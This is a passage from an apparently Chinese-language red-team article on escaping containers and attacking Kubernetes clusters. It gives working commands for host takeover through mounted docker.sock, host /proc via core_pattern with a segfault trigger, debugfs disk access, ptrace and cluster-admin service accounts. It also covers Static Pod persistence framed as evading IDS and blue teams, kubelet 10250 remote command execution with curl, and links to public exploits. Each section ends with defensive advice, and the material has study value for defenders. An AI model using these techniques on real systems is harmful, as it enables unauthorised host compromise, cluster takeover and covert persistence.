3. 同样的，我们可以使用 mknod 创建相应的设备文件目录并使用 debugfs 进行访问，此时我们就有了读写宿主机任意文件的权限。

```bash
mknod near b 252 1
debugfs -w near
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft26N0dJav4icNaXnENfhzLNH3K7R4ODLpCDsEmWyiawlw3HjBaib8Mx8OQ/640?wx_fmt=png)

**防御建议**：
- 限制容器的 CAP_SYS_ADMIN 权限
- 使用 seccomp 过滤器限制容器内的系统调用
- 监控 cgroup 相关操作，特别是对 notify_on_release 和 release_agent 的修改
- 使用只读文件系统运行容器，减少攻击面

### 5.4. 特殊路径挂载导致的容器逃逸

这类的挂载很好理解，当例如宿主机的内的 /, /etc/, /root/.ssh 等目录的写权限被挂载进容器时，在容器内部可以修改宿主机内的 /etc/crontab、/root/.ssh/、/root/.bashrc 等文件执行任意命令，就可以导致容器逃逸。

执行下列命令可以很容易拥有这样的环境：

```bash
docker run -it -v /:/tmp/rootfs ubuntu bash
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftatOPnCicAiaV8lXHkvKuPQFT4aUSJicKE5FhfKibxWx3PQVAQAzJpMdxibw/640?wx_fmt=png)

**防御建议**：
- 避免将敏感目录挂载到容器中，特别是带有写权限
- 使用只读挂载（`ro`选项）当需要共享宿主机文件时
- 实施严格的卷挂载策略，明确定义允许挂载的路径
- 使用Pod Security Policies限制卷挂载

### 5.4.1 Docker in Docker

其中一个比较特殊且常见的场景是当宿主机的 /var/run/docker.sock 被挂载容器内的时候，容器内就可以通过 docker.sock 在宿主机里创建任意配置的容器，此时可以理解为可以创建任意权限的进程；当然也可以控制任意正在运行的容器。

```bash
# 在容器内访问Docker API
docker -H unix:///var/run/docker.sock ps

# 创建特权容器
docker -H unix:///var/run/docker.sock run -d --privileged -v /:/host alpine sleep infinity

# 进入新创建的容器
docker -H unix:///var/run/docker.sock exec -it CONTAINER_ID sh
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftw32wVunQaYQ1iczSQ50LvsNLQrqa0rG6mE3Ob2VSHh9gIj8gv5tgdVQ/640?wx_fmt=png)

这类的设计被称为： Docker in Docker。常见于需要对当前节点进行容器管理的编排逻辑容器里，历史上我遇到的场景举例：

a. 存在于 Serverless 的前置公共容器内

b. 存在于每个节点的日志容器内

如果你已经获取了此类容器的 full tty shell, 你可以用类似下述的命令创建一个通往宿主机的 shell。

```bash
./bin/docker -H unix:///tmp/rootfs/var/run/docker.sock run -d -it --rm --name rshell -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
```

如果想现在直接尝试此类逃逸利用的魅力，不妨可以试试 Google Cloud IDE 天然自带的容器逃逸场景，拥有 Google 账号可以直接点击下面的链接获取容器环境和利用代码，直接执行利用代码 try_google_cloud/host_root.sh 再 chroot 到 /rootfs 你就可以获取一个完整的宿主机 shell：  

https://ssh.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/neargle/cloud_native_security_test_case.git

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftJ2vstIzkOJLNRZNzSwMyPUDLiagDBia53jYDqCTFD5Jpy07WbxBJpNhg/640?wx_fmt=png)

当然容器内部不一定有条件安装或运行 docker client，一般获取的容器 shell 其容器镜像是受限且不完整的，也不一定能安装新的程序，即使是用 pip 或 npm 安装第三方依赖包也很困难。

此时基于 golang 编写简易的利用程序，利用交叉编译编译成无需依赖的单独 bin 文件下载到容器内执行就是经常使用的方法了。

**防御建议**：
- 避免将Docker socket挂载到容器中
- 如必须挂载，考虑使用Docker授权插件限制API访问
- 监控Docker API调用，检测异常行为
- 考虑使用podman、containerd等替代方案，它们提供更细粒度的权限控制

### 5.4.2 攻击挂载了主机 /proc 目录的容器

另一个比较有趣的场景就是挂载了主机 /proc 目录的容器，在历史的攻防演练中当我们遇到挂载了主机 /proc 目录的容器，一般都会有其它可以逃逸的特性，如 sys_ptrace 或者 sys_admin 等，但是其实挂载了主机 /proc 目录这个设置本身，就是一个可以逃逸在宿主机执行命令的特性。

我们可以简单的执行以下命令创建一个具有该配置的容器并获得其 shell：

```bash
docker run -v /proc:/host_proc --rm -it ubuntu bash
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftAB4cUYkuAw8qAOpVUiclIpDNYUxspI6KP34Zf91eVQ6xwiaNUqjm19hw/640?wx_fmt=png)

这里逃逸并在外部执行命令的方式主要是利用了 linux 的 /proc/sys/kernel/core_pattern 文件。

a. 首先我们需要利用在 release_agent 中提及的方法从 mount 信息中找出宿主机内对应当前容器内部文件结构的路径。

```bash
sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftR3jLLNribmw1DuJ0NO9kjn0fYslX59rhRdZVYMNl1mKYIS8M5gUkbdw/640?wx_fmt=png)

b. 此时我们在容器内的 /exp.sh 就对应了宿主机的 `/var/lib/docker/overlay2/a1a1e60a9967d6497f22f5df21b185708403e2af22eab44cfc2de05ff8ae115f/diff/exp.sh` 文件。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftH6nUncxl6ibtrUumbDmWNOdnibrBCJFwpf3HrTFZ9xFhhvkRa4BCgCjA/640?wx_fmt=png)

c. 因为宿主机内的 /proc 文件被挂载到了容器内的 /host_proc 目录，所以我们修改 /host_proc/sys/kernel/core_pattern 文件以达到修改宿主机 /proc/sys/kernel/core_pattern 的目的。

```bash
echo -e "|/var/lib/docker/overlay2/a1a1e60a9967d6497f22f5df21b185708403e2af22eab44cfc2de05ff8ae115f/diff/exp.sh \rcore" > /host_proc/sys/kernel/core_pattern
```

d. 此时我们还需要一个程序在容器里执行并触发 segmentation fault 使植入的 payload 即 exp.sh 在宿主机执行。

这里我们参考了 https://wohin.me/rong-qi-tao-yi-gong-fang-xi-lie-yi-tao-yi-ji-zhu-gai-lan/#4-2-procfs- 里的 c 语言代码和 CDK-TEAM/CDK 里面的 GO 语言代码：

```c
#include <stdio.h>
int main(void) {
    int *a = NULL;
    *a = 1;
    return 0;
}
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftEOJquTPhAf5XtlOBCEjRNM4qALicMhjMymWib58D2HkicTv7N9OcmpwZw/640?wx_fmt=png)

e. 当然不能忘记给 exp.sh 赋予可执行权限。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftYW4ibU65yhwJFibysUswDMOdiaSJbEIQkaZNdSusFBShsaHSS81KjZC0g/640?wx_fmt=png)

当容器内的 segmentation fault 被触发时，我们就达到了逃逸到宿主机在容器外执行任意代码的目的。

**防御建议**：
- 避免将宿主机的/proc目录挂载到容器中
- 如必须挂载，使用只读挂载并考虑使用ProcMount字段限制访问
- 监控对core_pattern等敏感文件的修改
- 使用seccomp过滤器限制容器内的系统调用

### 5.5. SYS_PTRACE 安全风险

当 docker 容器设置 --cap-add=SYS_PTRACE 或 Kubernetes PODS 设置 securityContext.capabilities 为 SYS_PTRACE 配置等把 SYS_PTRACE capabilities 权限赋予容器的情况，如果该容器也具备 hostpid 配置，那就可能导致容器逃逸。

可导致容器逃逸风险的 capabilities 权限还有很多，这里就不一一介绍啦。

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: ptrace-pod
spec:
  hostPID: true  # 允许访问宿主机进程
  containers:
  - name: ptrace-container
    image: ubuntu:latest
    command: ["sleep", "infinity"]
    securityContext:
      capabilities:
        add: ["SYS_PTRACE"]  # 添加SYS_PTRACE能力
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftiatm1LG35dC04AKvK7vbmJibx5iciaena0ptqib9W2xOY9cVTVShyFmBMFQ/640?wx_fmt=png)

这个场景很常见，因为无论是不是线上环境，业务进行故障重试和程序调试都是没办法避免的，所以容器经常被设置 ptrace 权限。

使用 capsh --print 可以判断当前容器是否附加了 ptrace capabilities。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftA5xR0WNgNA3DwdiaIoGn2mWmGGTzCwibmeRsejfKo8daibJ3fib6vxMWiaw/640?wx_fmt=png)

这里的利用方式和进程注入的方式大致无二，如果是使用 pupy 或 metasploit 维持容器的 shell 权限的话，利用框架现有的功能就能很方便的进行注入和利用。

当然，就如上面所述，拥有了该权限就可以在容器内执行 strace 和 ptrace 等工具，若只是一些常见场景的信息收集也不一定需要注入恶意 shellcode 进行逃逸才可以做到。

**防御建议**：
- 避免同时设置SYS_PTRACE和hostPID
- 使用Pod Security Policies限制容器权限
- 监控ptrace系统调用，检测异常行为
- 仅在必要的调试场景中临时启用SYS_PTRACE

### 5.6. 利用大权限的 Service Account

在 POD 启动时，Kubernetes 会默认为容器挂载一个 Service Account（服务账号）的 token 和证书。另外，默认情况下 Kubernetes 会创建一个名为 kubernetes.default 的 Service 用来指向 ApiServer。

Service 的域名格式如下图PPT所示，在容器里访问这个域名就能访问到 APIServer：
<img width="2036" height="1078" alt="image" src="https://github.com/user-attachments/assets/405a6f38-fef1-4d4c-942d-f4fa2f9dc40d" />


有了上述两个条件，我们就拥有了在容器内和 APIServer 通信和交互的方式，而且是带有 ServiceAccount 身份凭据的访问 apiserver。

Kubernetes Default Service

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftF3icYrbEyoajYW3lxKIYcevm66b3clvlQUIXxneO7LJLVqEibrEhHziaw/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftTvug1uFW0iaib9xCxBAGmXIO0M5xgOpWb3SlNabapWZnkko7SQGf5gOw/640?wx_fmt=png)

Default Service Account

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft7TibDhibGHJ9Hrb2uIPSCEGiaUgacRkL4THkcThMyGmN2gPDUADeJLBzQ/640?wx_fmt=png)

默认情况下，这个 Service Account 的证书和 token 虽然可以用于和 APIServer 通信，但是是没有权限进行利用的。

但是集群管理员可以为 Service Account 赋予权限，例如使用 cluster-admin 的 clusterrolebinding ：

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: service-account-admin
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftKYhULXklPpLiciaR5icMSuVehOY3FTUrkfIyCtvmj9IoiclZkZt5eW5gZA/640?wx_fmt=png)

此时，直接在容器里执行 kubectl 就可以集群管理员权限管理容器集群。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftia4aojurXia3vykNrLmzUp1LxDKqalKT9wofHFks3F7f3v9OAjiaKMm4Q/640?wx_fmt=png)

因此获取一个拥有挂载了 ClusterRole/cluster-admin 的 Service Account 的容器，其实就等于拥有了集群管理员的权限。

和这个核心相关的特性就是 **RBAC**： cluster-admin 虽然权限最大，但并非唯一能控制整个集群的权限，很多权限也能间接提权为 cluster-admin 权限。

**防御建议**：
- 遵循最小权限原则，为Service Account分配最小所需权限
- 避免使用cluster-admin角色绑定到Service Account
- 定期审计RBAC配置，移除不必要的权限
- 使用Pod Security Policies限制容器权限
- 考虑使用Kubernetes的RBAC审计工具

### 5.7. CVE-2020-15257 利用

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftkxc6w0j4uicMY3jcHMyYhwBHL3cqqVoavpqlOQMQhLBtUEKmCZW6OUQ/640?wx_fmt=png)

此前 containerd 修复了一个逃逸漏洞，当容器和宿主机共享一个 net namespace 时（如使用 --net=host 或者 Kubernetes 设置 pod container 的 .spec.hostNetwork 为 true）攻击者可对拥有特权的 containerd shim API 进行操作，可能导致容器逃逸获取宿主机权限、修改宿主机文件等危害。

该漏洞影响 containerd 1.3.9 之前的 1.3.x 版本和 1.4.3 之前的 1.4.x 版本。官方建议升级 containerd 以修复和防御该攻击；当然业务在使用时，也建议如无特殊需求不要将任何 host 的 namespace 共享给容器，如 Kubernetes PODS 设置 hostPID: true、hostIPC: true、hostNetwork: true 等。

我们测试升级 containerd 可能导致运行容器退出或重启，有状态容器节点的升级要极为慎重。也因为如此，业务针对该问题进行 containerd 升级的概率并不高。

利用目前最方便的 EXP 为：

https://github.com/cdk-team/CDK/wiki/Exploit:-shim-pwn

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft66U7coycRmetNGibBpXjwjN6mjYogWazh856zC1Ajmeq34tC2jXdI0Q/640?wx_fmt=png)

**防御建议**：
- 升级containerd到修复版本（1.3.9+或1.4.3+）
- 避免使用hostNetwork设置
- 实施网络策略，限制容器间通信
- 监控容器网络活动，检测异常行为

### 5.8. runc CVE-2019-5736 和容器组件历史逃逸漏洞综述

这个由 RUNC 实现而导致的逃逸漏洞太出名了，出名到每一次提及容器安全能力或容器安全研究都会被拿出来当做案例或 DEMO。但不得不说，这里的利用条件在实际的攻防场景里还是过于有限了；实际利用还是需要一些特定的场景才能真的想要去使用和利用它。

这里公开的 POC 很多，不同的环境和操作系统发行版本利用起来有一定的差异，可以参考进行利用：

1. github.com/feexd/pocs

2. github.com/twistlock/RunC-CVE-2019-5736

3. github.com/AbsoZed/DockerPwn.py

4. github.com/q3k/cve-2019-5736-poc

至于我们实际遇到的场景可以在 "容器相关组件的历史漏洞" 一章中查看。从攻防角度不得不说的是，这个漏洞的思路和 EXP 过于出名，几乎所有的 HIDS 都已经具备检测能力，甚至对某些 EXP 文件在静态文件规则上做了拉黑，所以大部分情况是使用该方法就等于在一定程度上暴露了行踪，需要谨慎使用。

**防御建议**：
- 升级runc到修复版本
- 实施容器镜像安全扫描，检测已知漏洞
- 监控容器运行时行为，检测异常活动
- 考虑使用gVisor、Kata Containers等提供更强隔离的容器运行时

### 5.9. 内核漏洞提权和逃逸概述

容器共享宿主机内核，因此我们可以使用宿主机的内核漏洞进行容器逃逸，比如通过内核漏洞进入宿主机内核并更改当前容器的 namespace，在历史内核漏洞导致的容器逃逸当中最广为人知的便是脏牛漏洞（CVE-2016-5195）了。

此外，近年来出现了多个可导致容器逃逸的重要内核漏洞：

1. **CVE-2022-0847 (Dirty Pipe)**：这是一个Linux内核漏洞，允许本地用户通过写入只读文件覆盖任意文件内容，从而获取提权。该漏洞影响Linux内核版本5.8及以上，直到5.16.11、5.15.25和5.10.102。利用此漏洞需要本地用户权限，且只能修改已打开的只读文件。

2. **CVE-2022-0185**：这是一个Linux内核中fs/fs_context.c的堆溢出漏洞，影响Linux内核5.1到5.15.2版本。攻击者可以通过精心构造的mount系统调用触发此漏洞，从容器内逃逸到宿主机。

3. **CVE-2020-14386**：这是一个Linux内核net/packet/af_packet.c中的漏洞，允许容器内的攻击者通过精心构造的网络数据包触发越界写入，从而可能导致容器逃逸。

4. **CVE-2020-8558**：这个漏洞允许攻击者绕过localhost绑定保护，影响Kubernetes集群中的容器。攻击者可以利用此漏洞访问绑定在localhost上的服务，从而可能导致权限提升。

这些漏洞的 POC 和 EXP 都已经公开，且不乏有利用行为，但同时大部分的 EDR 和 HIDS 也对 EXP 的利用具有检测能力，这也是利用内核漏洞进行容器逃逸的痛点之一。

**防御建议**：
- 定期更新内核版本，修复已知漏洞
- 使用安全增强型Linux内核，如grsecurity
- 实施seccomp过滤器，限制容器内的系统调用
- 监控异常系统调用和内核行为
- 考虑使用提供内核隔离的容器运行时，如Kata Containers

### 5.10. 写 StaticPod 逃逸或权限维持

利用 Static Pod 是我们在容器逃逸和远程代码执行场景找到的解决方案，他是 Kubernetes 里的一种特殊的 Pod，由节点上 kubelet 进行管理。在漏洞利用上有以下几点明显的优势：

1、 仅依赖于 kubelet

Static Pod 仅依赖 kubelet，即使 K8s 的其他组件都奔溃掉线，删除 apiserver，也不影响 Static Pod 的使用。在 Kubernetes 已经是云原生技术事实标准的现在，kubelet 几乎运行与每个容器宿主机节点之上。

2、 配置目录固定

Static Pod 配置文件写入路径由 kubelet config 的 staticPodPath 配置项管理，默认为 /etc/kubernetes/manifests 或 /etc/kubelet.d/，一般情况不做更改。需要注意的是，不同Kubernetes发行版的默认路径可能有所不同，建议在实际环境中进行确认。

3、 执行间隔比 Cron 更短

通过查看 Kubernetes 的源码，我们可以发现 kubelet 会每 20 秒监控新的 POD 配置文件并运行或更新对应的 POD；由 `c.FileCheckFrequency.Duration = 20 * time.Second` 控制，虽然 Cron 的每分钟执行已经算是非常及时，但 Static Pod 显然可以让等待 shell 的时间更短暂，对比 /etc/cron.daily/* ， /etc/cron.hourly/* ， /etc/cron.monthly/* ， /etc/cron.weekly/* 等目录就更不用说了。

另外，Cron 的分钟级任务也会遇到重复多次执行的问题，增加多余的动作更容易触发 IDS 和 IPS，而 Static Pod 若执行成功就不再调用，保持执行状态，仅在程序奔溃或关闭时可自动重启

4、 进程配置更灵活

Static Pod 支持 Kubernetes POD 的所有配置，等于可以运行任意配置的容器。不仅可以配置特权容器和 HostPID 使用 nscenter 直接获取容器宿主机权限；更可以配置不同 namespace、capabilities、cgroup、apparmor、seccomp 用于特殊的需求。

灵活的进程参数和 POD 配置使得 Static Pod 有更多方法对抗 IDS 和 IPS，因此也延生了很多新的对抗手法，这里就不再做过多介绍。

5、 检测新文件或文件变化的逻辑更通用

最重要的是，Static Pod 不依赖于 st_mtime 逻辑，也无需设置可执行权限，新文件检测逻辑更加通用。

```go
func (s *sourceFile) extractFromDir(name string) ([]*v1.Pod, error) {
    dirents, err := filepath.Glob(filepath.Join(name, "[^.]*"))
    if err != nil {
        return nil, fmt.Errorf("glob failed: %v", err)
    }
    pods := make([]*v1.Pod, 0, len(dirents))

```

而文件更新检测是基于 kubelet 维护的 POD Hash 表进行的，配置的更新可以很及时和确切的对 POD 容器进行重建。Static Pod 甚至包含稳定完善的奔溃重启机制，由 kubelet 维护，属于 kubelet 的默认行为无需新加配置。操作系统层的痕迹清理只需删除 Static Pod YAML 文件即可，kubelet 会自动移除关闭运行的恶意容器。同时，对于不了解 Static Pod 的蓝队选手来说，我们需要注意的是，使用 `kubectl delete` 删除恶意容器或使用 `docker stop` 关闭容器都无法完全清除 Static Pod 的恶意进程，kubelet 会守护并重启该 Pod。

**防御建议**：
- 监控Static Pod目录的文件变化
- 限制对kubelet配置目录的访问权限
- 实施Pod Security Policies限制Static Pod的权限
- 定期审计Static Pod配置
- 考虑使用文件完整性监控工具

## 6. 容器相关组件的历史漏洞

2020 年我们和腾讯云的同学一起处理跟进分析了多个官方开源分支所披露的安全问题，并在公司内外的云原生能力上进行复现、分析，从产品和安全两个角度出发探讨攻击场景，保障云用户和业务的安全。  

其中投入时间比较多的，主要是以下十个漏洞，每个都非常有趣，且都在云产品上得到了妥善的跟进和安全能力建设：

| CVE编号 | 影响组件 | 漏洞类型 | 影响版本 | 修复版本 |
|---------|---------|---------|---------|---------|
| CVE-2019-5736 | runc | 容器逃逸 | 所有版本 < 1.0-rc6 | runc 1.0-rc6 |
| CVE-2020-15257 | containerd | 容器逃逸 | 1.3.x < 1.3.9, 1.4.x < 1.4.3 | 1.3.9+, 1.4.3+ |
| CVE-2019-16884 | cri-o | 权限提升 | < 1.15.0 | 1.15.0+ |
| CVE-2020-8558 | kube-proxy | 网络绕过 | < 1.18.4 | 1.18.4+ |
| CVE-2020-8559 | kubelet | 权限提升 | < 1.18.6 | 1.18.6+ |
| CVE-2020-8557 | kubelet | DoS | < 1.18.6 | 1.18.6+ |
| CVE-2020-10749 | CNI插件 | 网络绕过 | 多个版本 | 多个修复版本 |
| CVE-2020-13401 | kubectl | 命令注入 | < 1.18.4 | 1.18.4+ |
| CVE-2020-8554 | kube-apiserver | 中间人攻击 | 多个版本 | 多个修复版本 |
| CVE-2020-8552 | kube-apiserver | DoS | < 1.17.3 | 1.17.3+ |

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftfyYibISQBmbTeyibKy0TwkdDMtGJIqoqlCDKkH4vaHxbb2MkzU3W6LRA/640?wx_fmt=png)

实际攻防场景里面我真实用过且在关键路径里起到作用的也就 CVE-2020-15257，其它漏洞的 POC 都只在漏洞公开时自建测试的环境复现和公司内服务的漏洞挖掘用了一下，有些环境虽然有漏洞，但是实际打真实目标却没怎么用得上。

值得一提的是最开始跟进分析时，因为 EXP 需要钓鱼让管理员去执行 docker exec 或 kubectl exec 才可以触发，所以不怎么看好的 CVE-2019-5736 RUNC 容器逃逸漏洞；反而是真的遇到几个无交互即可触发的场景。主要是 vscode server、jupyter notebook、container webconsole 等这种提供容器内交互式 shell 的多租户场景在企业内网里变多了，容器逃逸之后就是新的网络环境和主机环境。

**防御建议**：
- 定期更新容器运行时和Kubernetes组件
- 实施漏洞扫描和管理流程
- 监控容器运行时行为，检测异常活动
- 遵循最小权限原则配置容器
- 考虑使用提供更强隔离的容器运行时

## 7. 容器、容器编排组件 API 配置不当或未鉴权

就安全问题来说，业界普遍接触最多、最首当其冲的就是容器组件服务的未鉴权问题。我们在 2019 年的时候整理了一份 Kubernetes 架构下常见的开放服务指纹，提供给到了地表最强的扫描器洞犀团队，就现在看来这份指纹也是比较全的。

1.  kube-apiserver: 6443, 8080
    
2.  kubectl proxy: 8080, 8001
    
3.  kubelet: 10250, 10255, 4149
    
4.  dashboard: 30000
    
5.  docker api: 2375
    
6.  etcd: 2379, 2380
    
7.  kube-controller-manager: 10252
    
8.  kube-proxy: 10256, 31442
    
9.  kube-scheduler: 10251
    
10.  weave: 6781, 6782, 6783
    
11.  kubeflow-dashboard: 8080


前六个服务的非只读接口我们都曾经在渗透测试里遇到并利用过，都是一旦被控制可以直接获取相应容器、相应节点、集群权限的服务，也是广大公网蠕虫的必争之地。

### 7.1. 组件分工

各个组件未鉴权所能造成的风险，其实从它们在 Kubernetes 集群环境里所能起到的作用就能很明显的判断出来，如 APIServer 是所有功能的主入口，则控制 APIServer 基本上等同控制集群的所有功能；而 kubelet 是单个节点用于进行容器编排的 Agent，所以控制 kubelet 主要是对单个节点下的容器资源进行控制。

组件分工上较为完整的图例可参考：

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftdtJiaulxvzaFwvM2qeOiatjO2G11dHW3xZmiaicBunCZiazicZKPH7gZYhpg/640?wx_fmt=png)

想必这样也相对晦涩难懂，我简化了一下，假如用户想在集群里面新建一个容器集合单元，那各个组件以此会相继做什么事情呢？

1. 用户与 kubectl 或者 Kubernetes Dashboard 进行交互，提交需求。（例: kubectl create -f pod.yaml）;

2. kubectl 会读取 ~/.kube/config 配置，并与 apiserver 进行交互，协议：http/https;

3. apiserver 会协同 ETCD 等组件准备下发新建容器的配置给到节点，协议：http/https（除 ETCD 外还有例如 kube-controller-manager, scheduler 等组件用于规划容器资源和容器编排方向，此处简化省略）;

4. apiserver 与 kubelet 进行交互，告知其容器创建的需求，协议：http/https；

5. kubelet 与 Docker 等容器引擎进行交互，创建容器，协议：http/unix socket.

至此我们的容器已然在集群节点上创建成功，创建的流程涉及 ETCD、apiserver、kubelet、dashboard、docker remote api 等组件，可见每个组件被控制会造成的风险和危害，以及相应的利用方向；

对于这些组件的安全性，除了不同组件不一样的鉴权设计以外，网络隔离也是非常必要的，常规的 iptables 设置和规划也可以在容器网络中起到作用（容器网络的很多能力也是基于 iptables 实现的）。

另外比较有容器特色的方案就是 Network Policy 的规划和服务网格的使用，能从容器、POD、服务的维度更加优雅的管理和治理容器网络以及集群内流量。这些组件的资料和对应渗透手法，这里我们一一介绍一下:

### 7.2. apiserver

如果想要攻击 apiserver, 下载 kubectl 是必经之路。

```bash
curl -LO "https://dl.kubernetes.io/release/$(curl -L -s https://dl.kubernetes.io/release/stable.txt)/bin/linux/amd64/kubectl"
```

默认情况下，apiserver 都是有鉴权的：

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftM9oEyDHU4pstSLynedSxPkZn3uuzJ4VXzdHrnUh00cljFu0UOibnc3Q/640?wx_fmt=png)

当然也有未鉴权的配置：kube-apiserver --insecure-bind-address=0.0.0.0 --insecure-port=8080，此时请求接口的结果如下：

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftibmOReZolOmwMr0YkrznWE9ZJ0BN3sE1QOlw5LSgMWpUv8c2znbNAiag/640?wx_fmt=png)

对于这类的未鉴权的设置来说，访问到 apiserver 一般情况下就获取了集群的权限：

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftqK18Uoe76DboIH9ffRN54PjPXaYDheClyBAEZ37ib7v0ibzZ792oNNNg/640?wx_fmt=png)

可能还有同学不知道 apiserver 在 Kubernetes / 容器编排集群里的重要地位，这里简单介绍一下：在蓝军眼中的 Kubernetes APIServer 其重要性，如下图:

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftXeGING1DWkTWc8UOib0eJabJvib590vZU3o9LhrKW8ZZFXHdLInRAq3g/640?wx_fmt=png)

所以，对于针对 Kubernetes 集群的攻击来说，获取 admin kubeconfig 和 apiserver 所在的 master node 权限基本上就是获取主机权限路程的终点。

至于如何通过 apiserver 进行持续渗透和控制，参考 kubectl 的官方文档是最好的：

https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands

**防御建议**：
- 禁用非安全端口(--insecure-port=0)
- 实施强身份认证和授权机制
- 使用TLS加密API通信
- 实施网络策略，限制对API服务器的访问
- 定期审计API服务器访问日志

### 7.3. kubelet

每一个 Node 节点都有一个 kubelet 服务，kubelet 监听了 10250，10248，10255 等端口。

其中 10250 端口是 kubelet 与 apiserver 进行通信的主要端口，通过该端口 kubelet 可以知道自己当前应该处理的任务，该端口在最新版 Kubernetes 是有鉴权的，但在开启了接受匿名请求的情况下，不带鉴权信息的请求也可以使用 10250 提供的能力；因为 Kubernetes 流行早期，很多挖矿木马基于该端口进行传播和利用，所以该组件在安全领域部分群体内部的知名度反而会高于 APIServer。

在新版本 Kubernetes 中当使用以下配置打开匿名访问时便可能存在 kubelet 未授权访问漏洞：

```yaml
kubelet:
  authentication:
    anonymous:
      enabled: true
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftjpiaZkeEpJDRXf1GS3Nlm9abfNO8O1dRRxUkfZqZ348GMgcib4JgdkRw/640?wx_fmt=png)

如果 10250 端口存在未授权访问漏洞，那么我们可以先使用 / pods 接口获取集群的详细信息，如 namespace，pods，containers 等

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftza2qbic1CqZm3icSicwqGdQnlEh3tsbyKjicmgeh1jVibjb2gibHLaHDYI4Q/640?wx_fmt=png)

之后再通过

```bash
curl -k https://kubernetes-node-ip:10250/run/<namespace>/<pod-name>/<container-name> -d "cmd=id"
```

的方式在任意容器里执行命令

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftzyicibzfCRmZZVmRdbO0Aibn7LI4132GPk73g7pwkqepME7ekBaZEw7tQ/640?wx_fmt=png)

此时，选择我们所有控制的容器快速过滤出高权限可逃逸的容器就很重要，在上述 /pods API 中可以获取到每个 POD 的配置，包括了 host*、securityContext、volumes 等配置，可以根据容器逃逸知识快速过滤出相应的 POD 进行控制。

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSfttdDKiaAdhbeGWsnJzJibwcbfDOwFibRibvylp5hobyicibzG028FENiaF8rbw/640?wx_fmt=png)

由于这里 10250 鉴权当前的 Kubernetes 设计是默认安全的，所以 10255 的开放就可能更加容易在红蓝对抗中起到至关重要的作用。10255 本身为只读端口，虽然开放之后默认不存在鉴权能力，无法直接利用在容器中执行命令，但是可以获取环境变量 ENV、主进程 CMDLINE 等信息，里面包含密码和秘钥等敏感信息的概率是很高的，可以快速帮我们在对抗中打开局面。

**防御建议**：
- 禁用匿名访问(anonymous.enabled=false)
- 启用X509客户端证书认证
- 实施网络策略，限制对kubelet端口的访问
- 禁用只读端口(--read-only-port=0)
- 定期审计kubelet访问日志

### 7.4. dashboard

dashboard 是 Kubernetes 官方推出的控制 Kubernetes 的图形化界面，在 Kubernetes 配置不当导致 dashboard 未授权访问漏洞的情况下，通过 dashboard 我们可以控制整个集群。

在 dashboard 中默认是存在鉴权机制的，用户可以通过 kubeconfig 或者 Token 两种方式登录，当用户开启了 enable-skip-login 时可以在登录界面点击 Skip 跳过登录进入 dashboard

![图片](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftxutjWrROJS2HetWnJL1wzjMU355bCb7KjSBfu9yCxeVjiaKoKjh2rlw/640?wx_fmt=png)

